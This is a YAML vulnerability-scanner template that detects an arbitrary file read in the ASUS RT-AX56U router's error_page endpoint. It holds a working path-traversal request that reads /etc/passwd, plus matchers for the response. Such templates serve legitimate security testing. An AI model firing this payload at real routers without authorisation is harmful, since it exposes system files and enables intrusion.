id: poc-yaml-asus-rt-ax56u-error-page-file-read

info:
  name: ASUS RT-AX56U Router Error Page Arbitrary File Read
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
  description: |
    The ASUS RT-AX56U router is vulnerable to an arbitrary file read vulnerability via the error_page endpoint.

http:
  - method: GET
    path:
      - "/error_page.htm?current_lang=/////etc/passwd"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "root:"
          - "/bin/sh"
